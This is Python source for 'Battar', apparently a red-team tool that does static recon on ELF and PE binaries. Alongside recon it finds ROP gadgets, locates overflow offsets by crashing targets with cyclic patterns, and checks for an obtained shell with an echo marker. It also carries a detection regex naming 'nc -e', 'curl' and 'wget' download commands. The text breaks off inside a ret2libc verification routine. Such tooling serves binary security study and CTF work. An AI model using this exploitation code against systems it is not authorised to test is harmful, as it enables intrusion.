#!/usr/bin/env python3
"""
Battar — Quick static recon for ELF & PE (exe) binaries
file info + protections + functions/symbols/imports/exports
Usage: battar <path_to_binary> [--section NAME ...] [--all] [--limit N]

Part of Battar red-core toolkit
"""

import sys
import os
import re
import json
import math
import time
import threading
import io
import tempfile
import contextlib
import argparse
import subprocess
import shutil
from pathlib import Path
from collections import Counter
from datetime import datetime, timezone


class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GRAY = "\033[97m"
    MAGENTA = "\033[95m"
    BLOOD_RED = "\033[38;5;88m"   # dark, "bloody" red
    DARK_BLUE = "\033[38;5;18m"   # deep dark blue


# Default number of rows shown per listing section before truncation
DEFAULT_LIMIT = 40

# Section names usable with --section
ALL_SECTIONS = [
    "build", "packer", "entropy", "functions", "symbols", "plt", "got",
    "sections", "imports", "exports", "strings", "interesting", "dangerous",
    "exploit", "gadgets",
]

# ROP gadgets as raw byte sequences. Any address where these exact bytes occur
# is a usable gadget when jumped to directly — the byte stream doesn't need to
# be "aligned" with how the original compiler disassembled it, since the CPU
# just executes from wherever it's told to. That's the whole basis of ROP, so
# a plain byte search is correct here (no disassembler needed).
GADGET_PATTERNS_64 = [
    ("pop rdi; ret", b"\x5f\xc3"),
    ("pop rsi; ret", b"\x5e\xc3"),
    ("pop rdx; ret", b"\x5a\xc3"),
    ("pop rcx; ret", b"\x59\xc3"),
    ("pop rbx; ret", b"\x5b\xc3"),
    ("pop rbp; ret", b"\x5d\xc3"),
    ("pop rax; ret", b"\x58\xc3"),
    ("pop rsp; ret", b"\x5c\xc3"),
    ("pop r8; ret", b"\x41\x58\xc3"),
    ("pop r9; ret", b"\x41\x59\xc3"),
    ("pop r10; ret", b"\x41\x5a\xc3"),
    ("pop r12; ret", b"\x41\x5c\xc3"),
    ("pop r13; ret", b"\x41\x5d\xc3"),
    ("pop r14; ret", b"\x41\x5e\xc3"),
    ("pop r15; ret", b"\x41\x5f\xc3"),
    # Combined multi-register gadgets — when present these shorten a chain
    # a lot (one address instead of stitching several 2-instruction gadgets).
    ("pop rdi; pop rsi; pop rdx; pop r10; ret", b"\x5f\x5e\x5a\x41\x5a\xc3"),
    ("pop rdi; pop rsi; pop rdx; ret", b"\x5f\x5e\x5a\xc3"),
    ("pop rsi; pop rdx; ret", b"\x5e\x5a\xc3"),
    ("pop rax; pop rdi; ret", b"\x58\x5f\xc3"),
    ("pop rbx; pop r12; ret", b"\x5b\x41\x5c\xc3"),
    ("pop rsi; pop r15; ret", b"\x5e\x41\x5f\xc3"),
    ("pop rdi; pop rsi; ret", b"\x5f\x5e\xc3"),
    ("pop rdi; pop rbp; ret", b"\x5f\x5d\xc3"),
    # Stack pivots / cleanup — useful for chaining past leftover args
    ("add rsp, 8; ret", b"\x48\x83\xc4\x08\xc3"),
    ("add rsp, 0x10; ret", b"\x48\x83\xc4\x10\xc3"),
    ("leave; ret", b"\xc9\xc3"),
    ("xor eax, eax; ret", b"\x31\xc0\xc3"),
    ("syscall; ret", b"\x0f\x05\xc3"),
    ("syscall", b"\x0f\x05"),
    ("ret", b"\xc3"),
]

GADGET_PATTERNS_32 = [
    ("pop eax; ret", b"\x58\xc3"),
    ("pop ebx; ret", b"\x5b\xc3"),
    ("pop ecx; ret", b"\x59\xc3"),
    ("pop edx; ret", b"\x5a\xc3"),
    ("pop esi; ret", b"\x5e\xc3"),
    ("pop edi; ret", b"\x5f\xc3"),
    ("pop ebp; ret", b"\x5d\xc3"),
    # Combined multi-register gadgets for shorter chains (e.g. int 0x80 setup)
    ("pop edx; pop ecx; pop ebx; ret", b"\x5a\x59\x5b\xc3"),
    ("pop ecx; pop edx; pop ebx; ret", b"\x59\x5a\x5b\xc3"),
    ("pop eax; pop ebx; ret", b"\x58\x5b\xc3"),
    ("pop ebx; pop esi; pop edi; ret", b"\x5b\x5e\x5f\xc3"),
    ("leave; ret", b"\xc9\xc3"),
    ("int 0x80; ret", b"\xcd\x80\xc3"),
    ("int 0x80", b"\xcd\x80"),
    ("ret", b"\xc3"),
]

# Risky function names -> (severity, why it's risky). Matched case-insensitively.
DANGEROUS_FUNCS = {
    # Unix / libc
    "gets": ("CRITICAL", "No bounds checking at all — classic unbounded buffer overflow vector."),
    "strcpy": ("HIGH", "No bounds checking — can overflow the destination buffer."),
    "strcat": ("HIGH", "No bounds checking — can overflow the destination buffer."),
    "sprintf": ("HIGH", "No bounds checking on formatted output — buffer overflow risk."),
    "vsprintf": ("HIGH", "Same overflow risk as sprintf with a va_list argument."),
    "scanf": ("MEDIUM", "%s with no width limit can overflow the destination buffer."),
    "sscanf": ("MEDIUM", "Same risk as scanf when parsing untrusted input."),
    "system": ("HIGH", "Executes a shell command — command injection risk if input is attacker-controlled."),
    "popen": ("HIGH", "Spawns a shell — command injection risk."),
    "execve": ("MEDIUM", "Executes another program — check how argv/envp are built."),
    "execl": ("MEDIUM", "Executes another program — check how the args are built."),
    "execlp": ("MEDIUM", "Executes another program — check how the args are built."),
    "execv": ("MEDIUM", "Executes another program — check how argv is built."),
    "execvp": ("MEDIUM", "Executes another program — check how argv is built."),
    "memcpy": ("LOW", "Bounded copy, but a wrong/unchecked length argument can still overflow."),
    "strncpy": ("LOW", "Bounded, but doesn't guarantee null-termination — check usage."),
    "alloca": ("MEDIUM", "Stack allocation with attacker-controlled size can blow the stack."),
    "printf": ("LOW", "If the format string is attacker-controlled → format string vulnerability."),
    "fprintf": ("LOW", "Same format-string risk as printf."),
    "syslog": ("LOW", "Format-string risk if the fmt argument is attacker-controlled."),
    "strtok": ("LOW", "Not thread-safe and has subtle shared-state bugs."),
    "realpath": ("LOW", "Older glibc versions could overflow a fixed-size buffer without a size arg."),
    # Windows / WinAPI
    "strcpya": ("HIGH", "No bounds checking — can overflow the destination buffer."),
    "strcpyw": ("HIGH", "No bounds checking — can overflow the destination buffer."),
    "lstrcpya": ("HIGH", "No bounds checking — can overflow the destination buffer."),
    "lstrcpyw": ("HIGH", "No bounds checking — can overflow the destination buffer."),
    "lstrcata": ("HIGH", "No bounds checking — can overflow the destination buffer."),
    "wsprintfa": ("HIGH", "No bounds checking on formatted output — buffer overflow risk."),
    "wsprintfw": ("HIGH", "No bounds checking on formatted output — buffer overflow risk."),
    "winexec": ("HIGH", "Executes a command line — command injection risk if input is attacker-controlled."),
    "shellexecutea": ("MEDIUM", "Launches a program/document — check how the path/args are built."),
    "shellexecutew": ("MEDIUM", "Launches a program/document — check how the path/args are built."),
    "createprocessa": ("MEDIUM", "Spawns a new process — check how the command line is built."),
    "createprocessw": ("MEDIUM", "Spawns a new process — check how the command line is built."),
    "virtualalloc": ("MEDIUM", "Allocates executable memory — common in shellcode loaders/injectors."),
    "writeprocessmemory": ("MEDIUM", "Writes into another process's memory — common in code-injection techniques."),
    "createremotethread": ("HIGH", "Runs code inside another process — classic process-injection primitive."),
    "loadlibrarya": ("LOW", "Dynamically loads a DLL — with GetProcAddress this can hide imports from static analysis."),
    "loadlibraryw": ("LOW", "Dynamically loads a DLL — with GetProcAddress this can hide imports from static analysis."),
    "getprocaddress": ("LOW", "Resolves function addresses at runtime — often used to evade static import analysis."),
}

# Section-name signatures for common packers/protectors
KNOWN_PACKER_SECTIONS = {
    "UPX0": "UPX", "UPX1": "UPX", "UPX2": "UPX", ".UPX0": "UPX", ".UPX1": "UPX",
    ".ASPACK": "ASPack", ".ADATA": "ASPack",
    ".PETITE": "Petite",
    ".THEMIDA": "Themida", ".TMDATA": "Themida", ".TMTHDR": "Themida",
    ".VMP0": "VMProtect", ".VMP1": "VMProtect", ".VMP2": "VMProtect",
    ".ENIGMA1": "Enigma Protector", ".ENIGMA2": "Enigma Protector",
    ".NSP0": "NsPack", ".NSP1": "NsPack", ".NSP2": "NsPack",
    ".MPRESS1": "MPRESS", ".MPRESS2": "MPRESS",
    "!EPACK": "EPack",
    ".PECOMPACT2": "PECompact",
    ".PACKED": "Generic packer",
}

# (tag, compiled regex) checked in order against every extracted string.
# Order matters: more specific / higher-severity categories are checked first
# so a string matching several patterns gets the most security-relevant tag.
# The broad catch-alls (BASE64_BLOB, HEX_BLOB) are checked last since almost
# anything long enough can look like them.
INTERESTING_PATTERNS = [
    ("PRIVATE_KEY", re.compile(r"-----BEGIN (RSA |EC |DSA |OPENSSH |ENCRYPTED )?PRIVATE KEY-----")),
    ("AWS_KEY", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("JWT", re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")),
    ("CRYPTO_WALLET", re.compile(r"\b(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{25,39})\b")),
    ("CREDENTIAL", re.compile(r"(?i)\b(password|passwd|pwd|api[_-]?key|secret|token|auth)\b\s*[:=]")),
    ("SHELL_CMD", re.compile(r"(?i)(powershell(\.exe)?\s+-enc|cmd\.exe\s*/c|/bin/(sh|bash)\s+-c|"
                              r"wget\s+https?://|curl\s+https?://|nc\s+-e|certutil\s+-decode|rundll32)")),
    ("SQL_QUERY", re.compile(r"(?i)\b(select\s+.+\s+from|insert\s+into|update\s+.+\s+set|"
                              r"delete\s+from|drop\s+table|union\s+select)\b")),
    ("FORMAT_STR", re.compile(r"%n|%s.{0,4}%s.{0,4}%s")),
    ("REGISTRY_KEY", re.compile(r"HKEY_(LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT|USERS|CURRENT_CONFIG)")),
    ("GUID", re.compile(r"\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b")),
    ("USER_AGENT", re.compile(r"Mozilla/5\.0|User-Agent:")),
    ("URL", re.compile(r"https?://[^\s'\"<>]{4,}")),
    ("EMAIL", re.compile(r"[\w.+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b")),
    ("IP_PORT", re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b")),
    ("IP", re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")),
    ("WIN_PATH", re.compile(r"[A-Za-z]:\\[^\s\"']{2,}")),
    ("UNIX_PATH", re.compile(r"/(?:usr|etc|home|tmp|var|bin|sbin|lib|opt|root)/[^\s\"']*")),
    ("HEX_BLOB", re.compile(r"\b[0-9a-fA-F]{32,}\b")),
    ("BASE64_BLOB", re.compile(r"(?=[A-Za-z0-9+/]*[A-Za-z])(?=[A-Za-z0-9+/]*\d)[A-Za-z0-9+/]{40,}={0,2}")),
]


def _clear_screen():
    print("\033[2J\033[H", end="")


def _sword_animation():
    """A quick sword-draw-and-slash animation played once before the logo
    settles. Purely cosmetic — skipped automatically on non-interactive
    output (e.g. piped to a file) since there's no point animating there."""
    if not sys.stdout.isatty():
        return

    frames = [
        r"""



                                                        ⚔""",
        r"""


                                              ⚔
                                             ╱""",
        r"""

                                    ⚔
                                   ╱
                              ────╱""",
        r"""
                          ⚔
                         ╱
                    ────╱
                   ╱
              ▄▄▄▄╱
             ▀▀▀▀""",
        r"""

   ═══════════════════════════════════════════════════►""",
        r"""

 ▓▒░═══════════════════════════════════════════════════░▒▓""",
    ]

    try:
        for frame in frames:
            _clear_screen()
            print(f"{C.BOLD}{C.BLOOD_RED}{frame}{C.RESET}")
            time.sleep(0.09)
        _clear_screen()
    except Exception:
        # never let a cosmetic animation crash the actual tool
        pass


class _CuttingAnimation:
    """A small in-place looping sword animation that plays on the REAL
    terminal (bypassing any stdout redirect) for as long as recon is
    actually running, then stops cleanly once the work is done."""

    FRAMES = [
        r"""  ⚔╲
   ╲
    ╲""",
        r"""   ⚔
  ╱ ╲""",
        r"""  ╱⚔
 ╱""",
        r"""  ✦⚡✦""",
    ]

    def __init__(self, label, real_stream=None):
        self.label = label
        self.stream = real_stream or sys.stdout
        self._stop = threading.Event()
        self._thread = None
        self._lines_printed = 0

    def _write(self, text):
        try:
            self.stream.write(text)
            self.stream.flush()
        except Exception:
            pass

    def _render(self, frame):
        block = f"{C.BOLD}{C.BLOOD_RED}{frame}{C.RESET}\n{C.GRAY}⚔ cutting through {self.label}...{C.RESET}\n"
        if self._lines_printed:
            self._write(f"\033[{self._lines_printed}A\033[J")
        self._write(block)
        self._lines_printed = block.count("\n")

    def _run(self):
        if not self.stream.isatty():
            return
        i = 0
        try:
            while not self._stop.is_set():
                self._render(self.FRAMES[i % len(self.FRAMES)])
                i += 1
                self._stop.wait(0.12)
        except Exception:
            pass

    def start(self):
        if not self.stream.isatty():
            return
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=1)
        if self._lines_printed:
            self._write(f"\033[{self._lines_printed}A\033[J")


def intro_banner():
    _sword_animation()

    art = r"""
██████╗  █████╗ ████████╗████████╗ █████╗ ██████╗
██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗
██████╔╝███████║   ██║      ██║   ███████║██████╔╝
██╔══██╗██╔══██║   ██║      ██║   ██╔══██║██╔══██╗
██████╔╝██║  ██║   ██║      ██║   ██║  ██║██║  ██║
╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
""".rstrip("\n")

    print(f"{C.BOLD}{C.BLOOD_RED}{art}{C.RESET}")
    subtitle = "Battar — بتّار — red-core toolkit"
    width = max(len(l) for l in art.split("\n"))
    pad = max(0, (width - len(subtitle)) // 2)
    print(f"{' ' * pad}{C.BOLD}{C.GRAY}{subtitle}{C.RESET}\n")


def banner(text):
    width = 70
    print(f"\n{C.BOLD}{C.CYAN}{'═' * width}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN} {text}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}{'═' * width}{C.RESET}")


def kv(key, value, color=C.RESET, key_width=22):
    print(f"  {C.BOLD}{C.GRAY}{key:<{key_width}}{C.RESET}{C.BOLD}{color}{value}{C.RESET}")


def note(text):
    print(f"  {C.BOLD}{C.GRAY}   └─ {text}{C.RESET}")


def remaining_note(remaining, limit):
    print(f"  {C.BOLD}{C.YELLOW}... {remaining} more not shown "
          f"(showing first {limit} — use --all to show everything, "
          f"or --limit N to change this){C.RESET}")


def shannon_entropy(data):
    """Shannon entropy in bits/byte (0.0 = uniform/empty, 8.0 = fully random)."""
    if not data:
        return 0.0
    counts = Counter(data)
    length = len(data)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())


def entropy_bar(value, width=24):
    """Render a colored block-bar for an entropy value out of 8.0."""
    filled = max(0, min(width, round((value / 8.0) * width)))
    color = C.RED if value >= 7.2 else (C.YELLOW if value >= 6.5 else C.GREEN)
    bar = "█" * filled + "░" * (width - filled)
    return f"{C.BOLD}{color}[{bar}]{C.RESET}"


SEV_COLOR = {"CRITICAL": C.RED, "HIGH": C.RED, "MEDIUM": C.YELLOW, "LOW": C.RESET}


def badge(sev):
    """A small bracketed, colored severity badge, e.g. [CRITICAL]."""
    color = SEV_COLOR.get(sev, C.RESET)
    return f"{C.BOLD}{color}[{sev}]{C.RESET}"


def show_entropy(overall, section_entropies, args, summary=None):
    banner("ENTROPY")

    color = C.RED if overall >= 7.2 else (C.YELLOW if overall >= 6.5 else C.GREEN)
    print(f"  {C.BOLD}{C.GRAY}{'Overall file entropy':<24}{C.RESET}{entropy_bar(overall)} "
          f"{C.BOLD}{color}{overall:.2f} / 8.00{C.RESET}")
    if overall >= 7.2:
        note("Very high overall entropy — the binary may be packed, compressed, or encrypted")
    elif overall >= 6.5:
        note("Moderately high — worth checking the individual sections below")
    else:
        note("Normal range for an unpacked binary with typical code/data/strings")

    if summary is not None:
        summary["entropy"] = overall

    if section_entropies:
        rows = sorted(section_entropies.items(), key=lambda x: x[1], reverse=True)
        total = len(rows)
        shown = rows if args.all else rows[:args.limit]
        name_width = max(20, max((len(n) for n, _ in rows), default=0) + 2)
        print(f"\n  {C.BOLD}{'Section':<{name_width}}{'Entropy':<10}{'Visual'}{C.RESET}")
        print(f"  {C.GRAY}{'-' * (name_width + 40)}{C.RESET}")
        for name, val in shown:
            row_color = C.RED if val >= 7.2 else (C.YELLOW if val >= 6.5 else C.RESET)
            flag = "  <- possibly packed/encrypted" if val >= 7.2 else ""
            print(f"  {name:<{name_width}}{C.BOLD}{row_color}{val:<10.2f}{C.RESET}"
                  f"{entropy_bar(val, width=16)}{row_color}{flag}{C.RESET}")
        if not args.all and total > args.limit:
            remaining_note(total - args.limit, args.limit)


def detect_packer(section_names, section_entropies, is_pe=False, import_count=None,
                   overall_entropy=None, has_sections=True):
    findings = []
    for raw_name in section_names:
        key = raw_name.strip("\x00").strip().upper()
        if key in KNOWN_PACKER_SECTIONS:
            findings.append(("HIGH", f"Section '{raw_name.strip(chr(0))}' matches known packer: "
                                      f"{KNOWN_PACKER_SECTIONS[key]}"))

    if section_entropies:
        max_name, max_val = max(section_entropies.items(), key=lambda x: x[1])
        if max_val >= 7.5:
            findings.append(("MEDIUM", f"Section '{max_name}' has very high entropy "
                                        f"({max_val:.2f}/8.0) — likely packed or encrypted"))

    if not is_pe and not has_sections and overall_entropy is not None:
        sev = "HIGH" if overall_entropy >= 7.0 else "MEDIUM"
        findings.append((sev, f"No section headers present and overall entropy is "
                               f"{overall_entropy:.2f}/8.0 — classic signature of a stripped/packed "
                               f"ELF (e.g. UPX strips the section table when packing)"))

    if is_pe and import_count is not None and import_count <= 3:
        findings.append(("MEDIUM", f"Only {import_count} imported function(s) total — the binary may "
                                    f"resolve APIs dynamically (LoadLibrary/GetProcAddress) to evade "
                                    f"static analysis"))
    return findings


def show_packer(findings, summary=None):
    banner("PACKER DETECTION")
    if summary is not None:
        summary["packer_findings"] = len(findings)
    if not findings:
        print(f"  {C.GREEN}No known packer signatures or high-entropy sections detected{C.RESET}")
        return
    for sev, msg in findings:
        print(f"  {badge(sev):<28}{C.BOLD}{msg}{C.RESET}")


def show_dangerous_functions(name_set, args, summary=None):
    banner("DANGEROUS FUNCTIONS")
    found = []
    seen = set()
    for raw in name_set:
        base = raw.split("@")[0]
        key = base.lower()
        if key in DANGEROUS_FUNCS and key not in seen:
            sev, note_text = DANGEROUS_FUNCS[key]
            found.append((sev, base, note_text))
            seen.add(key)

    if summary is not None:
        summary["dangerous_count"] = len(found)
        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        summary["dangerous_top"] = min((f[0] for f in found), key=lambda s: sev_order.get(s, 4), default=None)

    if not found:
        print(f"  {C.GREEN}No commonly-dangerous function names found in imports/symbols{C.RESET}")
        note("This can also mean the binary is stripped — absence isn't proof of safety")
        return

    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    found.sort(key=lambda x: sev_order.get(x[0], 4))
    total = len(found)
    shown = found if args.all else found[:args.limit]
    for sev, name, note_text in shown:
        print(f"  {C.BOLD}{name:<20}{C.RESET}{badge(sev)}")
        note(note_text)
    if not args.all and total > args.limit:
        remaining_note(total - args.limit, args.limit)


def get_text_section(elf_obj):
    """Return (data, virtual_address) of an ELF's .text section, or (b'', 0)."""
    try:
        sec = elf_obj.get_section_by_name(".text")
        if sec is not None:
            return sec.data(), sec.header.sh_addr
    except Exception:
        pass
    return b"", 0


def find_gadgets(data, base_addr, patterns):
    """Search raw bytes for each (name, byte-pattern) and return
    {name: [addr1, addr2, ...]} — every occurrence, ascending by address,
    not just the first. Uses a single compiled regex scan per pattern
    instead of a manual find()-loop."""
    found = {}
    for name, pattern in patterns:
        addrs = [base_addr + m.start() for m in re.finditer(re.escape(pattern), data)]
        if addrs:
            found[name] = addrs
    return found


def _first_gadget(gadgets, name):
    """Convenience accessor: lowest address for a gadget name, or None."""
    addrs = gadgets.get(name)
    return addrs[0] if addrs else None


_ROPGADGET_DUMP_CACHE = {}


def _external_gadget_dump(binary_path, timeout=25):
    """Fallback for when our own fixed byte-pattern list doesn't cover a
    needed gadget: shell out to ROPgadget (or ropper) ONCE per binary,
    parse every gadget it finds, and cache the result — so looking up
    several missing gadget names against the same file only pays the
    subprocess cost once."""
    if binary_path in _ROPGADGET_DUMP_CACHE:
        return _ROPGADGET_DUMP_CACHE[binary_path]

    result = {}
    rop_exe = shutil.which("ROPgadget")
    ropper_exe = shutil.which("ropper")

    try:
        if rop_exe:
            proc = subprocess.run([rop_exe, "--binary", binary_path, "--depth", "6"],
                                   capture_output=True, text=True, timeout=timeout)
            for line in proc.stdout.splitlines():
                line = line.strip()
                if " : " not in line:
                    continue
                addr_str, insn = line.split(" : ", 1)
                try:
                    addr = int(addr_str.strip(), 16)
                except ValueError:
                    continue
                norm = "; ".join(p.strip() for p in insn.strip().rstrip(";").split(";") if p.strip())
                result.setdefault(norm, []).append(addr)
        elif ropper_exe:
            proc = subprocess.run([ropper_exe, "--file", binary_path, "--nocolor"],
                                   capture_output=True, text=True, timeout=timeout)
            for line in proc.stdout.splitlines():
                line = line.strip()
                if ":" not in line or not line.startswith("0x"):
                    continue
                addr_str, insn = line.split(":", 1)
                try:
                    addr = int(addr_str.strip(), 16)
                except ValueError:
                    continue
                norm = "; ".join(p.strip() for p in insn.strip().rstrip(";").split(";") if p.strip())
                result.setdefault(norm, []).append(addr)
    except Exception:
        pass

    for name in result:
        result[name] = sorted(set(result[name]))

    _ROPGADGET_DUMP_CACHE[binary_path] = result
    return result


def _first_gadget_with_fallback(gadgets, name, binary_path):
    """Look up a gadget in our own fast byte-scan results first; only if
    that comes up empty do we pay for an external ROPgadget/ropper pass."""
    addr = _first_gadget(gadgets, name)
    if addr is not None:
        return addr, False
    dump = _external_gadget_dump(binary_path)
    addrs = dump.get(name)
    return (addrs[0], True) if addrs else (None, False)


def show_gadgets(elf, args, libc=None, summary=None):
    banner("ROP GADGETS")
    patterns = GADGET_PATTERNS_64 if elf.bits == 64 else GADGET_PATTERNS_32

    text_data, text_base = get_text_section(elf)
    binary_gadgets = find_gadgets(text_data, text_base, patterns) if text_data else {}

    total_bin = sum(len(v) for v in binary_gadgets.values())
    if summary is not None:
        summary["gadgets_found"] = total_bin

    if not binary_gadgets:
        print(f"  {C.YELLOW}No .text section data available, or none of the common gadgets "
              f"were found in the binary itself{C.RESET}")
    else:
        rows = sorted(((name, addr) for name, addrs in binary_gadgets.items() for addr in addrs),
                       key=lambda x: x[1])
        total = len(rows)
        shown = rows if args.all else rows[:args.limit]
        print(f"  {C.BOLD}{C.CYAN}From the binary itself (absolute address) — {total} total:{C.RESET}")
        print(f"  {C.BOLD}{'Address':<20}{'Gadget'}{C.RESET}")
        print(f"  {C.GRAY}{'-' * 50}{C.RESET}")
        for name, addr in shown:
            width = 8 if elf.bits == 32 else 16
            print(f"  {C.BOLD}{C.CYAN}0x{addr:0{width}x}{C.RESET}    {C.BOLD}{name}{C.RESET}")
        if not args.all and total > args.limit:
            remaining_note(total - args.limit, args.limit)
        if elf.pie:
            note("Binary is PIE — add the leaked runtime base to these addresses before using them")

    if libc is not None:
        libc_text_data, libc_text_base = get_text_section(libc)
        libc_gadgets = find_gadgets(libc_text_data, libc_text_base, patterns) if libc_text_data else {}
        if libc_gadgets:
            rows = sorted(((name, addr) for name, addrs in libc_gadgets.items() for addr in addrs),
                           key=lambda x: x[1])
            total = len(rows)
            shown = rows if args.all else rows[:args.limit]
            print(f"\n  {C.BOLD}{C.MAGENTA}From the resolved libc (offset — add libc.address at "
                  f"runtime) — {total} total:{C.RESET}")
            print(f"  {C.BOLD}{'Offset':<20}{'Gadget'}{C.RESET}")
            print(f"  {C.GRAY}{'-' * 50}{C.RESET}")
            for name, addr in shown:
                print(f"  {C.BOLD}{C.MAGENTA}libc + 0x{addr:x}{C.RESET}    {C.BOLD}{name}{C.RESET}")
            if not args.all and total > args.limit:
                remaining_note(total - args.limit, args.limit)


def _attempt_offset_once(elf, pattern_len, timeout):
    """One try: send a cyclic pattern of the given length, wait for a crash,
    and inspect the corefile. Returns (offset_or_None, message, signal_or_None)."""
    from pwn import process, cyclic, cyclic_find

    p = None
    try:
        p = process(elf.path, stderr=subprocess.STDOUT)
        payload = cyclic(pattern_len)
        p.sendline(payload)

        waited = 0.0
        step = 0.2
        while waited < timeout:
            if p.poll(block=False) is not None:
                break
            time.sleep(step)
            waited += step

        status = p.poll(block=False)
        if status is None:
            return None, f"no crash within {timeout}s at pattern length {pattern_len}", None

        if status >= 0:
            return None, (f"exited normally (code {status}) at pattern length {pattern_len} — "
                           f"no crash, doesn't look vulnerable this way"), None

        sig = -status

        if sig == 6:  # SIGABRT — glibc prints a specific reason, don't just guess "canary"
            try:
                tail = p.recvall(timeout=1)
            except Exception:
                tail = b""
            if b"stack smashing detected" in tail:
                return None, "SIGABRT: stack smashing detected — a stack canary caught the " \
                              "overflow before the return address was reached", sig
            if b"buffer overflow detected" in tail or b"*** buffer overflow" in tail:
                return None, "SIGABRT: _FORTIFY_SOURCE caught an oversized write (e.g. a " \
                              "*_chk-guarded sprintf/memcpy/strcpy) — different fix than a stack " \
                              "canary: the bounds check triggered before any overflow happened", sig
            if b"malloc" in tail.lower() or b"free(): " in tail or b"corrupted" in tail.lower():
                return None, f"SIGABRT: looks like heap corruption was detected " \
                              f"({tail.strip()[-120:]!r}), not a stack overflow", sig
            return None, f"SIGABRT (not stack-smashing or FORTIFY — possibly a manual abort() " \
                          f"or assertion): {tail.strip()[-120:]!r}", sig

        try:
            core = p.corefile
        except Exception as e:
            return None, f"killed by signal {sig} but no corefile produced ({e}) — " \
                         f"check 'ulimit -c unlimited'", sig

        core_path = getattr(core, "file", None)
        core_path = core_path.name if core_path is not None else None

        try:
            # Guard against a stale/leftover core file from a different, unrelated
            # process (e.g. a reused PID with an old core.PID never cleaned up) —
            # only trust it if it actually belongs to the process we just ran.
            if getattr(core, "pid", None) != p.pid:
                return None, (f"found a corefile but its pid ({getattr(core, 'pid', '?')}) doesn't "
                               f"match the target's pid ({p.pid}) — likely a stale core file, ignoring it"), sig

            # Broad register sweep: direct PC hijack first (frame-pointer-omitted
            # builds), then saved-frame-pointer based (standard prologue/epilogue),
            # then general-purpose registers as a last resort (useful when a
            # register is loaded straight from the buffer before any crash).
            checks = [
                ("pc", 0), ("rip", 0), ("eip", 0),
                ("rbp", 8), ("ebp", 4),
                ("rax", 0), ("rbx", 0), ("rcx", 0), ("rdx", 0), ("rsi", 0), ("rdi", 0),
                ("r8", 0), ("r9", 0), ("r10", 0), ("r11", 0), ("r12", 0), ("r13", 0),
                ("r14", 0), ("r15", 0), ("eax", 0), ("ebx", 0), ("ecx", 0), ("edx", 0),
            ]
            for reg, adjust in checks:
                if hasattr(core, reg):
                    try:
                        val = getattr(core, reg)
                    except Exception:
                        continue
                    off = cyclic_find(val)
                    if off != -1 and off >= 0:
                        return off + adjust, f"crash via {reg}={hex(val)}, cyclic offset {off} (+{adjust})", sig

            return None, "crashed but no register matched the cyclic pattern", sig
        finally:
            # Don't let core.PID files pile up in the working directory across runs.
            if core_path:
                try:
                    os.remove(core_path)
                except OSError:
                    pass
    finally:
        if p is not None:
            try:
                p.close()
            except Exception:
                pass


def find_offset_dynamic(path, elf, timeout=5, pattern_lens=(300, 600, 1500, 4000)):
    """Actually run the target locally with De Bruijn cyclic patterns (trying
    progressively longer ones if needed), let it crash, then read the
    corefile to compute the exact overflow offset.
    Returns (offset_or_None, message)."""
    try:
        from pwn import context
    except ImportError:
        return None, "pwntools not available"

    try:
        context.clear()
        context.arch = "amd64" if elf.bits == 64 else "i386"
        context.bits = elf.bits
        context.log_level = "critical"
    except Exception as e:
        return None, f"couldn't set up pwntools context: {e}"

    saw_abort_msg = None
    last_msg = "no attempts made"
    for pattern_len in pattern_lens:
        try:
            offset, msg, sig = _attempt_offset_once(elf, pattern_len, timeout)
        except Exception as e:
            last_msg = f"dynamic test failed: {e}"
            continue

        if offset is not None:
            return offset, f"{msg} (pattern length {pattern_len})"

        if sig == 6:  # SIGABRT — _attempt_offset_once already worked out *why*
            saw_abort_msg = msg
        last_msg = msg

    if saw_abort_msg:
        return None, saw_abort_msg
    return None, f"gave up after trying pattern lengths {list(pattern_lens)}: {last_msg}"


def _recv_and_check_marker(p, marker, timeout=3):
    time.sleep(0.3)
    try:
        p.sendline(f"echo {marker}".encode())
        data = p.recvrepeat(timeout=timeout)
    except Exception as e:
        return False, f"no response after sending payload ({e})"
    if marker.encode() in data:
        return True, "shell confirmed (echo marker received back)"
    return False, f"no marker in output — got: {data[:120]!r}"


def _read_leak_u64(p, timeout=2):
    """Read whatever the target has printed and pick the line that looks like
    a plausible leaked 64-bit pointer, skipping any earlier echoed junk
    (e.g. from a printf(buf) call that ran before the ROP chain fires)."""
    from pwn import u64
    time.sleep(0.3)
    try:
        data = p.recvrepeat(timeout=timeout)
    except Exception:
        return None
    lines = [l for l in data.split(b"\n") if l]
    for line in reversed(lines):
        candidate = line.strip().ljust(8, b"\x00")[:8]
        try:
            val = u64(candidate)
        except Exception:
            continue
        # typical Linux x86-64 shared-library / PIE address ranges
        if 0x555500000000 <= val <= 0x7fffffffffff:
            return val
    if lines:
        try:
            return u64(lines[-1].strip().ljust(8, b"\x00")[:8])
        except Exception:
            pass
    return None


def verify_strategy_a(elf, offset, binsh_addr, system_addr, pop_rdi_bin, libc, pop_rdi_libc_offset,
                       align_ret=None):
    """Actually run Strategy A locally and confirm a shell is obtained.
    If align_ret is given, an extra bare 'ret' gadget is inserted right before
    the call to system() to fix x86-64 stack alignment (movaps crashes)."""
    from pwn import process, p64, context
    context.clear()
